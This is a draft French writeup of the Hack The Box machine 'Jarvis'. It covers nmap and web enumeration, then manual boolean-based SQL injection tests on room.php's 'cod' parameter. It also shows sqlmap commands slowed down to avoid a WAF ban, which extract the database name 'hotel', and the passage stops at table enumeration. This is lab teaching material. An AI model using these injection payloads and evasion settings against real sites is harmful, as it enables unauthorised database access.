---
# === Archetype writeups – v1 (stable) ===
# === Archetype: writeups (Page Bundle) ===
# Copié vers content/writeups/<nom_ctf>/index.md

# H1 SEO (via title, pas dans le markdown)
title: "Jarvis — HTB Easy Writeup & Walkthrough"
linkTitle: "Jarvis"
slug: "jarvis"
date: 2026-07-12T16:01:53+02:00
#lastmod: 2026-07-12T16:01:53+02:00
draft: true

# --- PaperMod / navigation ---
type: "writeups"
summary: "Summary générique de machine CTF"
description: "Description générique de machine CTF"
tags: ["Hack The Box","HTB Easy","linux-privesc"]
categories: ["Mes writeups"]

# Ajouter ensuite uniquement des tags techniques réellement utilisés dans le writeup,
# par exemple :
# - prise de pied : "Web", "SSH", "FTP"
# - faille : "XSS", "LFI", "RCE", "Path Traversal", "Shellshock"
# - techno / produit : "Grafana", "Chamilo", "CMS Made Simple", "js2py"
# - CVE : "CVE-2021-43798"
# - pivot : "Credential Reuse"
# - privesc spécifique : "sudo", "Docker", "Cron", "ACL", "PATH Hijacking", "tmux", "npbackup", "pspy64"

# --- TOC & mise en page ---
ShowToc: true
TocOpen: true
# toc_droite: 1

# --- Cover / images (Page Bundle) ---
cover:
  image: "image.png"
  alt: "Jarvis"
  caption: ""
  relative: true
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# --- Paramètres CTF (placeholders à éditer après création) ---
ctf:
  platform: "Hack The Box"
  machine: "Jarvis"
  difficulty: "Easy"
  target_ip: "10.129.x.x"
  skills: ["Enumeration","Web","Privilege Escalation"]
  time_spent: "2h"
  # vpn_ip: "10.10.14.xx"
  # notes: "Points d'attention…"

# --- Options diverses ---
# weight: 10
# ShowBreadCrumbs: true
# ShowPostNavLinks: true

# --- SEO Reminders (à compléter après création) ---
# 1) Titre :
#    - Doit contenir : Nom Machine + HTB Easy + Writeup
# 2) Description :
#    - Résumé 130–160 caractères
#    - Style “Mix Parfait” : pédagogique + technique
#    - Exemple : "Writeup de <machine> (HTB Easy) : énumération claire, analyse de la vulnérabilité et escalade structurée."
# 3) ALT (image de couverture) :
#    - Mixer vulnérabilité + pédagogie + progression
#    - Exemple : "Machine <machine> HTB Easy vulnérable à <faille>, expliquée étape par étape jusqu'à l'escalade."
# 4) Tags :
#    - Toujours ["Easy"]
#    - Ajouter d'autres selon le thème : ["web","shellshock","heartbleed","enum"]
# 5) Structure :
#    - H1 = titre
#    - Description = meta description + preview social
#    - ALT = SEO image + accessibilité

# --- SEO CHECKLIST (à valider avant publication) ---

# [ ] 1) Titre (title + H1)
#     - Contient : Nom Machine + HTB Easy + Writeup
#     - Unique sur le site
#     - Lisible hors contexte HTB

# [ ] 2) Description (meta)
#     - 130–160 caractères
#     - Pas générique
#     - Ton pédagogique + technique
#     - Exemple :
#       "Writeup de <machine> (HTB Easy) : énumération claire,
#        compréhension de la vulnérabilité et escalade structurée."

# [ ] 3) Image de couverture
#     - Présente (ou fallback)
#     - Nom explicite
#     - Dimensions cohérentes

# [ ] 4) ALT de l’image
#     - Décrit la machine + l’approche
#     - Pédagogique (pas juste technique)
#     - Exemple :
#       "Machine <machine> HTB Easy exploitée étape par étape,
#        de l’énumération à l’escalade de privilèges."

# [ ] 5) Tags
#     - Toujours inclure la difficulté (ex: "Easy")
#     - Ajouter uniquement des tags techniques réels

# [ ] 6) Structure du contenu
#     - Un seul H1
#     - Sections claires et hiérarchisées
#     - Pas de sections SEO artificielles

---

<!-- ====================================================================
Tableau d'infos (modèle) — Remplacer les valeurs entre <...> après création.
Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
====================================================================
| Champ          | Valeur |
|----------------|--------|
| **Plateforme** | <Hack The Box> |
| **Machine**    | <Jarvis> |
| **Difficulté** | <Easy / Medium / Hard> |
| **Cible**      | <10.129.x.x> |
| **Durée**      | <2h> |
| **Compétences**| <Enumeration, Web, Privilege Escalation> |

---
-->
## Introduction

- Contexte (source, thème, objectif).
- Hypothèses initiales (services attendus, techno probable).
- Objectifs : obtenir `user.txt` puis `root.txt`.

---

## Énumération

{{< enum-intro >}}

### Scan initial

Le scan TCP complet (`scans_nmap/full_tcp_scan.txt`) montre les ports ouverts suivants :

```bash
# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/jarvis/full_tcp_scan.txt jarvis.htb
Nmap scan report for jarvis.htb (10.129.x.x)
Host is up (0.011s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
64999/tcp open  unknown

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 8.98 seconds
```

### Scan FTP/SMB

Après le scan initial, le script vérifie la présence éventuelle de services **FTP** ou **SMB** afin de lancer une énumération ciblée si nécessaire :

- **FTP** sur le port **21**
- **SMB** sur le port **139** et/ou **445**

Les résultats sont enregistrés dans (`scans_nmap/enum_ftp_smb_scan.txt`) :

```bash
# mon-nmap — ENUM FTP / SMB
# Target : jarvis.htb
# Date   : [date]

Aucun service FTP (21) ni SMB (139/445) détecté.
Ports ouverts détectés : 22,80,64999
```



### Scan agressif

Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités.

Ce scan fournit des informations détaillées sur les services et versions détectés.

Les résultats sont enregistrés dans (`scans_nmap/aggressive_vuln_scan.txt`) :

```bash
[+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour jarvis.htb
[+] Commande utilisée :
    nmap -Pn -A -sV -p"22,80,64999" --script="(http-vuln-* or http-shellshock or ssl-heartbleed or ssl-cert) and not (http-vuln-cve2017-1001000 or http-sql-injection or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 "jarvis.htb"

# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,80,64999 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed or ssl-cert) and not (http-vuln-cve2017-1001000 or http-sql-injection or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/jarvis/aggressive_vuln_scan_raw.txt jarvis.htb
Nmap scan report for jarvis.htb (10.129.x.x)
Host is up (0.0083s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   13.56 ms 10.10.16.1
2   7.00 ms  jarvis.htb (10.129.x.x)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 15.56 seconds
```



### Scan ciblé CMS

Le script exécute ensuite un scan ciblé CMS (`scans_nmap/cms_vuln_scan.txt`).

```bash
# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,80,64999 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/jarvis/cms_vuln_scan.txt jarvis.htb
Nmap scan report for jarvis.htb (10.129.x.x)
Host is up (0.0095s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-headers: 
|   Date: Sun, 12 Jul 2026 14:09:19 GMT
|   Server: Apache/2.4.25 (Debian)
|   Set-Cookie: PHPSESSID=m3iv2595r5n32c3afute10j9f6; path=/
|   Expires: Thu, 19 Nov 1981 08:52:00 GMT
|   Cache-Control: no-store, no-cache, must-revalidate
|   Pragma: no-cache
|   IronWAF: 2.0.3
|   Connection: close
|   Content-Type: text/html; charset=UTF-8
|   
|_  (Request type: HEAD)
|_http-title: Stark Hotel
| http-enum: 
|   /phpmyadmin/: phpMyAdmin
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'
|_  /js/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1; php: 2
|     /css/
|       css: 1
|     /fonts/flaticon/font/
|       css: 1
|     /images/
|       jpg: 8
|     /js/
|       js: 6
|   Longest directory structure:
|     Depth: 3
|     Dir: /fonts/flaticon/font/
|   Total files found (by extension):
|_    Other: 1; css: 2; jpg: 8; js: 6; php: 2
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
| http-headers: 
|   Date: [date]
|   Server: Apache/2.4.25 (Debian)
|   Last-Modified: Mon, 04 Mar 2019 02:10:40 GMT
|   ETag: "36-5833b43634c39"
|   Accept-Ranges: bytes
|   Content-Length: 54
|   IronWAF: 2.0.3
|   Connection: close
|   Content-Type: text/html
|   
|_  (Request type: HEAD)
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1
|   Longest directory structure:
|     Depth: 0
|     Dir: /
|   Total files found (by extension):
|_    Other: 1
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 28.47 seconds
```



### Scan UDP rapide

Le script lance également un scan UDP rapide afin de détecter d’éventuels services supplémentaires (`scans_nmap/udp_vuln_scan.txt`).

```bash
# Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/jarvis/udp_vuln_scan.txt jarvis.htb
Nmap scan report for jarvis.htb (10.129.x.x)
Host is up (0.013s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   closed        ntp
135/udp   open|filtered msrpc
137/udp   closed        netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp open|filtered unknown

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 10.03 seconds
```



### Énumération des chemins web

Pour la découverte des chemins web, tu peux utiliser le script dédié {{< script "mon-recoweb" >}}.

```bash
mon-recoweb jarvis.htb

# Résultats dans le répertoire scans_recoweb/
#  - scans_recoweb/RESULTS_SUMMARY.txt     ← vue d’ensemble des découvertes
#  - scans_recoweb/dirb.log
#  - scans_recoweb/dirb_hits.txt
#  - scans_recoweb/ffuf_dirs.txt
#  - scans_recoweb/ffuf_dirs_hits.txt
#  - scans_recoweb/ffuf_files.txt
#  - scans_recoweb/ffuf_files_hits.txt
#  - scans_recoweb/ffuf_dirs.json
#  - scans_recoweb/ffuf_files.json

```

Le fichier `RESULTS_SUMMARY.txt` regroupe les chemins découverts, ce qui évite de devoir parcourir l’ensemble des logs générés.

```bash
===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
Commande principale : /home/kali/.local/bin/mes-scripts/mon-recoweb
Script              : mon-recoweb v2.2.3

Cible        : jarvis.htb
Périmètre    : /
Date début   : [date]

Commandes exécutées (exactes) :

[dirb — découverte initiale]
dirb http://jarvis.htb/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/jarvis.htb/dirb.log

[ffuf — énumération des répertoires]
ffuf -u http://jarvis.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/jarvis.htb/ffuf_dirs.json 2>&1 | tee scans_recoweb/jarvis.htb/ffuf_dirs.log

[ffuf — énumération des fichiers]
ffuf -u http://jarvis.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/jarvis.htb/ffuf_files.json 2>&1 | tee scans_recoweb/jarvis.htb/ffuf_files.log

Processus de génération des résultats :
- Les sorties JSON produites par ffuf constituent la source de vérité.
- Les entrées pertinentes sont extraites via jq (URL, code HTTP, taille de réponse).
- Les réponses assimilables à des soft-404 sont filtrées par comparaison des tailles et des codes HTTP.
- Les URLs finales sont reconstruites à partir du périmètre scanné (racine du site ou sous-répertoire ciblé).
- Les résultats sont normalisés sous la forme :
    http://cible/chemin (CODE:xxx|SIZE:yyy)
- Les chemins sont ensuite classés par type :
    • répertoires (/chemin/)
    • fichiers (/chemin.ext)
- Le fichier RESULTS_SUMMARY.txt est généré par agrégation finale, sans retraitement manuel,
  garantissant la reproductibilité complète du scan.

----------------------------------------------------

=== Résultat global (agrégé) ===

http://jarvis.htb/. (CODE:200|SIZE:23628)
http://jarvis.htb/connection.php (CODE:200|SIZE:0)
http://jarvis.htb/css/
http://jarvis.htb/css/ (CODE:301|SIZE:306)
http://jarvis.htb/fonts/
http://jarvis.htb/fonts/ (CODE:301|SIZE:308)
http://jarvis.htb/footer.php (CODE:200|SIZE:2237)
http://jarvis.htb/.htaccess.bak (CODE:403|SIZE:275)
http://jarvis.htb/.htaccess (CODE:403|SIZE:275)
http://jarvis.htb/.htc (CODE:403|SIZE:275)
http://jarvis.htb/.ht (CODE:403|SIZE:275)
http://jarvis.htb/.htgroup (CODE:403|SIZE:275)
http://jarvis.htb/.htm (CODE:403|SIZE:275)
http://jarvis.htb/.html (CODE:403|SIZE:275)
http://jarvis.htb/.htpasswd (CODE:403|SIZE:275)
http://jarvis.htb/.htpasswds (CODE:403|SIZE:275)
http://jarvis.htb/.htuser (CODE:403|SIZE:275)
http://jarvis.htb/images/
http://jarvis.htb/images/ (CODE:301|SIZE:309)
http://jarvis.htb/index.php (CODE:200|SIZE:23628)
http://jarvis.htb/js/
http://jarvis.htb/js/ (CODE:301|SIZE:305)
http://jarvis.htb/nav.php (CODE:200|SIZE:1333)
http://jarvis.htb/.php (CODE:403|SIZE:275)
http://jarvis.htb/phpmyadmin/
http://jarvis.htb/phpmyadmin/ (CODE:301|SIZE:313)
http://jarvis.htb/server-status (CODE:403|SIZE:275)
http://jarvis.htb/server-status/ (CODE:403|SIZE:275)
http://jarvis.htb/wp-forum.phps (CODE:403|SIZE:275)

=== Détails par outil ===

[DIRB]
http://jarvis.htb/css/
http://jarvis.htb/fonts/
http://jarvis.htb/images/
http://jarvis.htb/index.php (CODE:200|SIZE:23628)
http://jarvis.htb/js/
http://jarvis.htb/phpmyadmin/
http://jarvis.htb/server-status (CODE:403|SIZE:275)

[FFUF — DIRECTORIES]
http://jarvis.htb/css/ (CODE:301|SIZE:306)
http://jarvis.htb/fonts/ (CODE:301|SIZE:308)
http://jarvis.htb/images/ (CODE:301|SIZE:309)
http://jarvis.htb/js/ (CODE:301|SIZE:305)
http://jarvis.htb/phpmyadmin/ (CODE:301|SIZE:313)
http://jarvis.htb/server-status/ (CODE:403|SIZE:275)

[FFUF — FILES]
http://jarvis.htb/. (CODE:200|SIZE:23628)
http://jarvis.htb/connection.php (CODE:200|SIZE:0)
http://jarvis.htb/footer.php (CODE:200|SIZE:2237)
http://jarvis.htb/.htaccess.bak (CODE:403|SIZE:275)
http://jarvis.htb/.htaccess (CODE:403|SIZE:275)
http://jarvis.htb/.htc (CODE:403|SIZE:275)
http://jarvis.htb/.ht (CODE:403|SIZE:275)
http://jarvis.htb/.htgroup (CODE:403|SIZE:275)
http://jarvis.htb/.htm (CODE:403|SIZE:275)
http://jarvis.htb/.html (CODE:403|SIZE:275)
http://jarvis.htb/.htpasswd (CODE:403|SIZE:275)
http://jarvis.htb/.htpasswds (CODE:403|SIZE:275)
http://jarvis.htb/.htuser (CODE:403|SIZE:275)
http://jarvis.htb/index.php (CODE:200|SIZE:23628)
http://jarvis.htb/nav.php (CODE:200|SIZE:1333)
http://jarvis.htb/.php (CODE:403|SIZE:275)
http://jarvis.htb/wp-forum.phps (CODE:403|SIZE:275)
```



### Recherche de vhosts

Enfin, tu peux tester la présence de vhosts à l’aide du script {{< script "mon-subdomains" >}}.

```bash
=== mon-subdomains jarvis.htb START ===
Script       : mon-subdomains
Version      : mon-subdomains 2.0.1
Date         : [date]
Domaine      : jarvis.htb
IP           : 10.129.x.x
Mode         : large
Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
Codes        : 200,301,302,401,403  (strict=1)

VHOST totaux : 0
  - (aucun)

--- Détails par port ---
Port 80 (http)
  Baseline#1: code=200 size=23628 words=1653 (Host=daot3mm8vw.jarvis.htb)
  Baseline#2: code=200 size=23628 words=1653 (Host=o6pqndm66a.jarvis.htb)
  Baseline#3: code=200 size=23628 words=1653 (Host=qq60my34y2.jarvis.htb)
  VHOST (0)
    - (fuzzing sauté : wildcard probable)
    - (explication : réponse identique quel que soit Host → vhost-fuzzing non discriminant)

Port 64999 (http)
  Baseline#1: code=200 size=54 words=11 (Host=fkm65cif6r.jarvis.htb)
  Baseline#2: code=200 size=54 words=11 (Host=7nlv20jtcf.jarvis.htb)
  Baseline#3: code=200 size=54 words=11 (Host=fylhqnm91z.jarvis.htb)
  VHOST (0)
    - (fuzzing sauté : wildcard probable)
    - (explication : réponse identique quel que soit Host → vhost-fuzzing non discriminant)



=== mon-subdomains jarvis.htb END ===
```

Si aucun vhost distinct n’est identifié, ce fichier confirme l’absence de résultats supplémentaires.

## Prise pied

### Analyse des pistes issues de l’énumération

La phase d’énumération a mis en évidence plusieurs services et éléments intéressants autour de l’application web hébergée sur `jarvis.htb`.

Le port `80` donne accès à un site de réservation hôtelière développé en PHP.



![Page d’accueil du site de réservation Jarvis](jarvis-htb-index.png)

En explorant le site, tu découvres plusieurs pages permettant d’afficher les informations relatives aux différentes chambres proposées. Les liens correspondants sont construits sur le même modèle :

```text
http://jarvis.htb/room.php?cod=x
```



![Pages de présentation des chambres utilisant le paramètre cod](room-php-cod.png)

Le paramètre `cod` reçoit une valeur numérique différente selon la chambre sélectionnée et semble donc être utilisé pour récupérer dynamiquement les informations affichées.

L’énumération révèle également la présence d’une interface phpMyAdmin. Celle-ci pourrait permettre d’administrer la base de données, mais son accès nécessite des identifiants que tu ne possèdes pas à ce stade.



![Page de connexion à l’interface phpMyAdmin](jarvis-phpmyadmin.png)

Les résultats de l’énumération indiquent par ailleurs que le site semble protégé par **IronWAF**. Il s’agit d’un pare-feu applicatif web chargé d’analyser les requêtes HTTP et de bloquer celles qui paraissent malveillantes.

Un autre service web est accessible sur le port `64999` et affiche uniquement le contenu suivant :

```text
Hey you have been banned for 90 seconds, don't be bad 
```

![Page du service web accessible sur le port 64999](jarvis-64999.png)

Cette page très sommaire semble liée au fonctionnement ou à la configuration d’IronWAF, sans pour autant constituer l’interface du pare-feu lui-même ni fournir directement d’information exploitable.

Tu disposes donc de plusieurs pistes potentielles : l’application PHP, le paramètre `cod`, l’interface phpMyAdmin et le service associé à IronWAF. Cependant, aucune d’entre elles ne révèle encore de point d’entrée évident.

La piste la plus accessible consiste alors à examiner plus précisément le comportement des paramètres que tu peux contrôler, en particulier le paramètre `cod` utilisé par les pages `room.php`.

Comme sa valeur semble servir à récupérer dynamiquement les informations d’une chambre depuis la base de données, une éventuelle injection SQL constitue une hypothèse qu’il convient désormais de vérifier.

### Recherche d’une injection SQL

#### Vérification manuelle du comportement du paramètre `cod`

Le paramètre `cod` utilisé par la page `room.php` reçoit normalement une valeur numérique correspondant à la chambre à afficher :

```url
http://jarvis.htb/room.php?cod=2
```

Avec cette valeur, l’application affiche correctement les informations de la chambre numéro `2`.

![](jarvis-room-code-2.png)

Avant d’utiliser un outil automatisé, tu modifies manuellement ce paramètre afin d’observer la manière dont il est traité par l’application.

Tu ajoutes d’abord une apostrophe après la valeur numérique :

```url
http://jarvis.htb/room.php?cod=2'
```

Cette fois, la page ne retourne plus les informations de la chambre. 

![](jarvis-room-code-2-apostrophe.png)

Ce comportement laisse penser que l’apostrophe perturbe la syntaxe d’une requête SQL construite à partir de la valeur de `cod`.

Tu compares ensuite le résultat de deux conditions SQL simples, l’une toujours vraie et l’autre toujours fausse :

```url
http://jarvis.htb/room.php?cod=2 AND 1=1
```

La condition `1=1` étant vraie, la page continue d’afficher les informations de la chambre numéro `2`.

```url
http://jarvis.htb/room.php?cod=2 AND 1=2
```

La condition `1=2` étant fausse, les informations de la chambre ne sont plus affichées.

Cette différence de comportement montre que la condition ajoutée au paramètre semble être interprétée par le serveur de base de données. Le paramètre `cod` présente donc les caractéristiques d’une injection SQL de type booléen, où le contenu retourné dépend du résultat vrai ou faux de la condition injectée.

Afin de confirmer cette différence de comportement de manière plus objective, tu compares ensuite la taille des réponses retournées par le serveur avec `curl` et `wc -c` :

```bash
curl -s 'http://jarvis.htb/room.php?cod=2' | wc -c
curl -s 'http://jarvis.htb/room.php?cod=2%20AND%201=1' | wc -c
curl -s 'http://jarvis.htb/room.php?cod=2%20AND%201=2' | wc -c
curl -s 'http://jarvis.htb/room.php?cod=999' | wc -c
```

Les résultats obtenus sont les suivants :

```txt
6131
6131
5916
5916
```

La requête normale avec `cod=2` et celle contenant la condition vraie `AND 1=1` retournent toutes les deux une réponse de `6131` octets. La condition ajoutée ne modifie donc pas le contenu affiché.

À l’inverse, la condition fausse `AND 1=2` retourne une réponse plus courte de `5916` octets. Cette taille est identique à celle obtenue avec `cod=999`, une valeur qui ne correspond à aucune chambre.

Cette comparaison montre que l’application retourne le contenu d’une chambre lorsque l’expression SQL est vraie et une page sans informations de chambre lorsqu’elle est fausse. 

Le résultat de la condition injectée influence donc directement la réponse du serveur, ce qui caractérise une injection SQL de type booléen.

La prochaine étape consiste à utiliser `sqlmap` afin de confirmer automatiquement la vulnérabilité et d’en déterminer plus précisément les caractéristiques.

#### Confirmation de l’injection avec sqlmap

Les vérifications manuelles montrent que le contenu retourné par l’application dépend du résultat vrai ou faux de la condition ajoutée au paramètre `cod`. 

Tu utilises maintenant `sqlmap` afin de confirmer automatiquement cette vulnérabilité. Comme l’énumération a révélé la présence de phpMyAdmin, tu peux raisonnablement orienter l’outil vers un environnement MySQL. 

Tu limites également les tests à la technique booléenne déjà observée, tout en réduisant la fréquence des requêtes afin de ne pas déclencher trop rapidement le mécanisme de protection du site :

```bash
sqlmap \
  -u 'http://jarvis.htb/room.php?cod=2' \
  -p cod \
  --dbms=MySQL \
  --technique=B \
  --level=1 \
  --risk=1 \
  --threads=1 \
  --delay=1 \
  --batch \
  --flush-session
```

L’option `-p cod` demande à `sqlmap` de tester uniquement le paramètre `cod`.

L’option `--dbms=MySQL` limite les charges utiles à celles compatibles avec MySQL, tandis que `--technique=B` restreint la recherche aux injections SQL booléennes.

Les options `--level=1` et `--risk=1` conservent les niveaux de test les plus prudents afin de limiter le nombre de requêtes envoyées.

Les options `--threads=1` et `--delay=1` imposent l’utilisation d’un seul thread et ajoutent une seconde d’attente entre les requêtes. Elles permettent ainsi de réduire le risque de bannissement par le mécanisme de protection détecté pendant l’énumération.

L’option `--batch` accepte automatiquement les réponses par défaut proposées par `sqlmap`.

Enfin, `--flush-session` efface les résultats précédemment enregistrés par l’outil pour forcer une nouvelle détection.

> **Remarque sur les échecs de `sqlmap`**
>
> Si une exécution de `sqlmap` déclenche le mécanisme de protection du site, les requêtes suivantes peuvent recevoir une réponse `404` pendant environ 90 secondes. Dans ce cas, tu dois attendre que la page retrouve son profil normal avant de relancer l’outil.
>
> Depuis un autre terminal, tu peux vérifier régulièrement l’état du site avec :
>
> ```bash
> curl -s -o /dev/null \
> -w 'code=%{http_code} length=%{size_download}\n' \
> 'http://jarvis.htb/room.php?cod=2'
> ```
>
> Tant que le bannissement est actif, la réponse ressemble à ceci :
>
> ```text
> code=404 length=54
> ```
>
> Tu peux reprendre les tests lorsque la page retourne de nouveau :
>
> ```text
> code=200 length=6131
> ```
>
> Cette vérification évite de relancer `sqlmap` trop tôt et de fausser sa détection avec les pages retournées par le mécanisme de protection.
>
> Si `sqlmap` continue malgré tout à réutiliser des résultats erronés ou incomplets, tu peux d’abord relancer la commande avec l’option `--flush-session`.
>
> Dans le pire des cas, tu peux supprimer uniquement les données enregistrées pour cette cible :
>
> ```bash
> rm -rf ~/.local/share/sqlmap/output/jarvis.htb
> ```
>
> Tu dois alors recommencer la détection de l’injection depuis une session propre.
>
> Cette suppression ciblée est préférable à l’effacement complet de `~/.local/share/sqlmap`, car elle ne concerne que la machine `jarvis.htb`. Attention toutefois : elle supprime également les fichiers déjà récupérés par `sqlmap` dans ce répertoire. Pense donc à les copier ailleurs si tu souhaites les conserver.
>
> Il faut parfois s’armer de beaucoup de patience et relancer `sqlmap` plusieurs fois avant d’obtenir une extraction complète et cohérente.

Voici le résultat de cette exécution :

```bash
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.10.6#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ [15:32:54 /date]/

[15:32:55] [INFO] flushing session file
[15:32:55] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=7b19b566d6d...4fp1sjs8l1'). Do you want to use those [Y/n] Y
[15:32:56] [INFO] checking if the target is protected by some kind of WAF/IPS
[15:32:57] [INFO] testing if the target URL content is stable
[15:32:58] [INFO] target URL content is stable
[15:32:59] [WARNING] heuristic (basic) test shows that GET parameter 'cod' might not be injectable
[15:33:00] [INFO] testing for SQL injection on GET parameter 'cod'
[15:33:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:33:05] [INFO] GET parameter 'cod' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Suite room is perfect")
[15:33:05] [INFO] checking if the injection point on GET parameter 'cod' is a false positive
GET parameter 'cod' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 13 HTTP(s) requests:
---
Parameter: cod (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cod=2 AND 5607=5607
---
[15:33:13] [INFO] testing MySQL
[15:33:14] [INFO] confirming MySQL
[15:33:18] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9 (stretch)
web application technology: Apache 2.4.25, PHP
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[15:33:19] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/jarvis.htb'

[*] ending @ 15:33:19 /date/
```

Cette fois, l’outil confirme que le paramètre GET `cod` est vulnérable :

```txt
Parameter: cod (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cod=2 AND 5607=5607
```

La charge utile générée ajoute une condition toujours vraie :

```txt
5607=5607
```

L’application continue alors de retourner les informations de la chambre, ce qui permet à `sqlmap` de distinguer une réponse vraie d’une réponse fausse.

L’outil identifie également le système de gestion de base de données utilisé :

```txt
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
```

L’injection SQL du paramètre `cod` est donc confirmée. Il s’agit d’une injection de type **boolean-based blind** sur un serveur MySQL utilisant un fork MariaDB.

### Énumération de la base de données

#### Identification de la base courante

L’injection étant désormais confirmée, tu peux demander à `sqlmap` d’identifier la base de données actuellement utilisée par l’application.

Tu relances l’outil avec l’option `--current-db` :

```bash
sqlmap \
  -u 'http://jarvis.htb/room.php?cod=2' \
  -p cod \
  --dbms=MySQL \
  --technique=B \
  --level=1 \
  --risk=1 \
  --threads=1 \
  --delay=1 \
  --batch \
  --current-db
```

L’option `--current-db` demande à `sqlmap` de récupérer le nom de la base courante.

Comme il s’agit d’une injection SQL de type **boolean-based blind**, la valeur recherchée n’est pas retournée directement dans la réponse du serveur. `sqlmap` doit la reconstruire caractère par caractère en envoyant successivement des conditions vraies ou fausses, puis en observant les différences dans les réponses HTTP.

La récupération est donc relativement lente. La progression apparaît peu à peu dans la sortie :

```
[INFO] retrieved: h
[INFO] retrieved: ho
[INFO] retrieved: hot
[INFO] retrieved: hote
[INFO] retrieved: hotel
```

Chaque caractère nécessite plusieurs requêtes, ce qui explique pourquoi cette méthode est beaucoup plus lente qu’une injection SQL permettant de récupérer directement les données.

À la fin de l’extraction, `sqlmap` affiche le résultat suivant :

```
current database: 'hotel'
```

La base de données actuellement utilisée par l’application est donc `hotel`.

#### Énumération des tables de la base `hotel`

Maintenant que tu connais le nom de la base courante, tu peux demander à `sqlmap` d’en énumérer les tables.

